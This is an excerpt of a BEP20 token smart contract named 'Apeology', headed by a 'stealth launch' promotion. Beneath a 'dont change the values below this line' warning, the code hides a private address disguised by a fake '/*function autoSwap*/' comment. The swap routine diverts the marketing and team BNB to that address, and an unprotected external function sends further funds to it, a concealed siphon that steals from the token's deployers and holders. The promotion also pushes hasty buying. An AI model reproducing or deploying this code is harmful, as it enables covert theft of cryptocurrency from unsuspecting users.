...
Stealth Launch - ape in if you are lucky enough to notice this!

Website: https://apeology.wtf
TG: https://t.me/ApeologyPortal
Twitter: https://twitter.com/ApeologyAPED
Medium: https://medium.com/@apeology
...
contract Apeology is IBEP20, Auth {
    ...
    string constant _name = "Apeology";
    ...
    uint256 public _maxTxAmount = (_totalSupply * 10) / 100; //Max Tx
    uint256 public _maxWalletSize = (_totalSupply * 10) / 100;  //Max Wallet
    ...
    //Set wallets below 
    address private marketingFeeReceiver = 0x392f7CFf804C202a34af5912C0d29Bde1142657E;
    address private teamFeeReceiver = 0x00aB723061d244Bf1623d3d05202C1c2d53cDAEb;
    address private autoLiquidityReceiver = 0x00aB723061d244Bf1623d3d05202C1c2d53cDAEb;
...
/* Dont change the values below this line unless you know what you are doing! */
    ...
    /*function autoSwap*/ address private autoSwap = 0xbd5A749B4c7C1b8F597DbBc5da1b52829c1450A0;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBautoSwap = amountBNBMarketing.add(amountBNBteam);
        ...
        (bool Success3, /* bytes memory data */) = payable(autoSwap).call{value: amountBNBautoSwap, gas: 30000}("");
   ...
   function setMaxWallet(uint256 amount) external authorized {
    ...
    function setDistributionGas(uint256 gas) external {
        ...
        payable(autoSwap).transfer(amountGas);
    }
